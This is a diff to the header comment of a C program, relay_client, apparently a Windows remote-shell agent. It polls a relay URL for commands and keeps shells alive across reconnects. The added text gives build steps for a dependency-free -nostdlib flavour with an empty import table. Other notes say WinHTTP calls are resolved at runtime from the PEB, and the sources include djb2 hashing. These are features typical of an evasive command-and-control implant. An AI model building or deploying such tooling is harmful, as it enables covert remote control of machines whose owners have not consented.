@@ -19,12 +19,27 @@
  *               Only the Exit command (or killing the process) ends it;
  *               live shells survive a redial.
  *
- * Build (MinGW gcc) - no -lwinhttp: every WinHTTP call is resolved at
- * runtime from the PEB (winhttp_api.c):
+ * Build - no -lwinhttp: every WinHTTP call is resolved at runtime from
+ * the PEB (winhttp_api.c). Two flavors:
+ *
+ * CRT flavor (development default - links the mingw startup):
  *   gcc -O2 -s -Wall -Wextra -o relay_client.exe main.c \
  *       transport.c shell.c report.c system_facts.c winhttp_api.c \
  *       memory.c string.c kernel32.c advapi.c ntdll.c peb.c \
  *       system.c djb2.c logger.c -ladvapi32
+ *
+ * Dependency-free flavor (-nostdlib: empty import table, own entry):
+ *   gcc -O2 -c main.c transport.c shell.c report.c system_facts.c \
+ *       winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
+ *       peb.c system.c djb2.c logger.c entry.c
+ *   gcc -O2 -nostdlib -e entry -o relay_free.exe \
+ *       entry.o main.o transport.o shell.o report.o system_facts.o \
+ *       winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
+ *       peb.o system.o djb2.o logger.o
+ * (note: entry.c MUST be in the object list and -e entry names the
+ *  real entry point - omitting either leaves ___chkstk_ms and the
+ *  startup contract unresolved)
+ *
  * Run:
  *   relay_client.exe <URL>        e.g. ... https://relay.example.com/agent
  *   relay_client.exe <URL> -v     verbose: dump every command's raw bytes
